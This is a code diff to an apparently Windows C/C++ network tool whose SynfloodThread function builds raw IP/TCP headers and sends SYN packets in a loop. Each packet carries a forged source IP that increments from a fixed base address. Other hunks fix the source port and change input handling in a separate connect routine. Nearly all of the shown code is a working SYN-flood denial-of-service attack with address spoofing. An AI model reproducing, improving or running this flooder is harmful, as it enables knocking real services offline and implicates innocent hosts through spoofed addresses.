@@ -147,7 +147,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 	sockAddr.sin_family = AF_INET;
 	sockAddr.sin_addr.s_addr = inet_addr(DestIP);
 	sockAddr.sin_port = htons(port);
-	FakeIpNet = inet_addr(DestIP);
+	FakeIpNet = inet_addr("10.168.150.1");
 	FakeIpHost = ntohl(FakeIpNet);
 
 
@@ -164,8 +164,8 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 
 
 	//填充TCP首部
-	tcpheader.th_dport = htons(port);
-	tcpheader.th_sport = htons(8080);
+	tcpheader.th_sport = htons(7000);
+	tcpheader.th_dport = htons(port);	
 	tcpheader.th_seq = htonl(SEQ + SendSEQ);
 	tcpheader.th_ack = 0;
 	tcpheader.th_lenres = (sizeof(TCP_HEADER) / 4 << 4 | 0);
@@ -191,7 +191,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 		ipheader.sourceIP = htonl(FakeIpHost + SendSEQ);
 		//tcp头
 		tcpheader.th_seq = htonl(SEQ + SendSEQ);
-		tcpheader.th_sport = htons(SendSEQ);
+		//tcpheader.th_sport = htons(SendSEQ);
 		tcpheader.th_sum = 0;
 		//TCP伪首部
 		PSD_HEADER.saddr = ipheader.sourceIP;
@@ -214,6 +214,7 @@ DWORD WINAPI SynfloodThread(LPVOID lp)
 			printf("sendto failed: %d\n", WSAGetLastError());
 			return 0;
 		}
+		
 		display();
 		//Sleep(2000);
 	}
@@ -312,7 +313,7 @@ int normalConnect() {
 	//发送,接收数据
 	while (1) {
 		cout << "请输入发送信息:";
-		cin >> send_buf;
+		cin.getline(send_buf, sizeof(send_buf));
 		send_len = send(s_server, send_buf, 100, 0);
 		if (send_len < 0) {
 			cout << "发送失败！" << GetLastError() << endl;
